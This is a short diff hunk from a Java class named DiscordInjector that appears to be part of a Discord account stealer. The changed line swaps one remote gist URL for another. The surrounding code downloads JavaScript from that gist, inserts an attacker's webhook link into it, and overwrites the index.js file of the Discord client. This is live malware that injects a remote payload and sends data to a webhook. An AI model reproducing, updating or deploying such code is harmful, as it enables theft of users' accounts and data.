@@ -52,7 +52,7 @@ public class DiscordInjector {
                                                 if (!legitMode) (new File(String.valueOf(file4) + "/luxotick1337")).mkdirs();
                                                 for (File file5 : (new File(String.valueOf(file4))).listFiles(File::isFile)) {
                                                     if ((String.valueOf(file5)).contains("index.js")) {
-                                                        Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/1869c3d7e65a104bf1817fb1f41c7e3a/raw/4ae32ef6772ae887dd190e4c4e9590e64d1babe1/sontest.js").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
+                                                        Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/0166c2b125e62ff9205b431dbc3ae164/raw/cbe0ab9afce74f342b0c688f54307e4486c9782e/ugh").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
                                                         List<String> results = new ArrayList<String>();
                                                         results.add(scanner.next().replace("%WEBHOOK_LINK%", webhookURL));
                                                         FileUtils.writeLines(file5, StandardCharsets.UTF_8.toString(), results);
